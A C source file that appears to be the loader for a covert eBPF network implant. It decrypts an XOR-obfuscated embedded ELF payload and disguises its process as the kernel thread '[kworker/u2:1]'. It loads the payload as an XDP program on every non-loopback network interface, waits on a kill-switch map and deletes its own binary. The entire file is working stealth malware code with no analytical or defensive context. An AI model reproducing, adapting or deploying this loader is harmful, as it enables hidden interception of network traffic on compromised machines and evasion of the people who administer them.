#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <libelf.h>
#include <gelf.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <sys/prctl.h>
#include <linux/bpf.h>
#include <net/if.h>
#include <dirent.h>
#include "ghost_blob.h"

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

static void x_c(uint8_t *d, size_t l) {
    uint32_t k = SEED_VAL;
    for (size_t i = 0; i < l; i++) {
        d[i] ^= (uint8_t)(k & 0xFF);
        k = (k >> 8) | (k << 24);
        k = k + 0x9E3779B9;
    }
}

static int m_c(enum bpf_map_type t, int ks, int vs, int me, const char *n) {
    union bpf_attr a = { .map_type = t, .key_size = ks, .value_size = vs, .max_entries = me };
    if (n) strncpy(a.map_name, n, 15);
    return syscall(SYS_bpf, BPF_MAP_CREATE, &a, sizeof(a));
}

int main(int argc, char **argv) {
    struct rlimit rl = {RLIM_INFINITY, RLIM_INFINITY};
    setrlimit(RLIMIT_MEMLOCK, &rl);
    prctl(PR_SET_NAME, "[kworker/u2:1]", 0, 0, 0);

    uint8_t *buf = malloc(ghost_o_len);
    memcpy(buf, ghost_o, ghost_o_len);
    x_c(buf, ghost_o_len);

    int cf = m_c(BPF_MAP_TYPE_LRU_HASH, 16, 8, 32768, "m_cache");
    int kf = m_c(BPF_MAP_TYPE_ARRAY, 4, 4, 1, "m_kill");

    elf_version(EV_CURRENT);
    Elf *e = elf_memory((char *)buf, ghost_o_len);
    Elf_Scn *scn = NULL;
    struct bpf_insn *insns = NULL;
    size_t icnt = 0;

    while ((scn = elf_nextscn(e, scn)) != NULL) {
        GElf_Shdr sh;
        gelf_getshdr(scn, &sh);
        char *name = elf_strptr(e, elf_getshdrstrndx(e), sh.sh_name);
        if (!strcmp(name, "xdp")) {
            insns = (struct bpf_insn *)elf_getdata(scn, NULL)->d_buf;
            icnt = sh.sh_size / sizeof(struct bpf_insn);
        }
    }

    scn = NULL;
    while ((scn = elf_nextscn(e, scn)) != NULL) {
        GElf_Shdr sh;
        gelf_getshdr(scn, &sh);
        if (sh.sh_type == SHT_REL || sh.sh_type == SHT_RELA) {
            Elf_Data *reldata = elf_getdata(scn, NULL);
            int rcnt = sh.sh_size / sh.sh_entsize;
            for (int i = 0; i < rcnt; i++) {
                GElf_Rel rel;
                gelf_getrel(reldata, i, &rel);
                size_t off = rel.r_offset / sizeof(struct bpf_insn);
                GElf_Sym sym;
                Elf_Data *symdata = elf_getdata(elf_getscn(e, sh.sh_link), NULL);
                gelf_getsym(symdata, GELF_R_SYM(rel.r_info), &sym);
                char *sname = elf_strptr(e, sh.sh_link + 1, sym.st_name);
                if (off < icnt && insns[off].code == (BPF_LD | BPF_IMM | BPF_DW)) {
                    insns[off].src_reg = BPF_PSEUDO_MAP_FD;
                    insns[off].imm = strstr(sname, "cache") ? cf : kf;
                }
            }
        }
    }

    union bpf_attr la = { .prog_type = BPF_PROG_TYPE_XDP, .insns = (uintptr_t)insns, .insn_cnt = icnt, .license = (uintptr_t)"GPL" };
    int pfd = syscall(SYS_bpf, BPF_PROG_LOAD, &la, sizeof(la));
    if (pfd < 0) return 1;

    DIR *dr = opendir("/sys/class/net");
    struct dirent *dn;
    while (dr && (dn = readdir(dr))) {
        if (dn->d_name[0] == '.' || !strcmp(dn->d_name, "lo")) continue;
        union bpf_attr l = { .link_create = { .prog_fd = pfd, .target_ifindex = if_nametoindex(dn->d_name), .attach_type = BPF_XDP } };
        syscall(SYS_bpf, BPF_LINK_CREATE, &l, sizeof(l));
    }
    if (dr) closedir(dr);

    uint32_t kv = 0;
    while (kv == 0) {
        union bpf_attr op = { .map_fd = kf, .key = (uintptr_t)&(uint32_t){0}, .value = (uintptr_t)&kv };
        if (syscall(SYS_bpf, BPF_MAP_LOOKUP_ELEM, &op, sizeof(op)) < 0) break;
        if (kv == 0) sleep(30);
    }

    elf_end(e);
    free(buf);
    unlink(argv[0]);
    return 0;
}
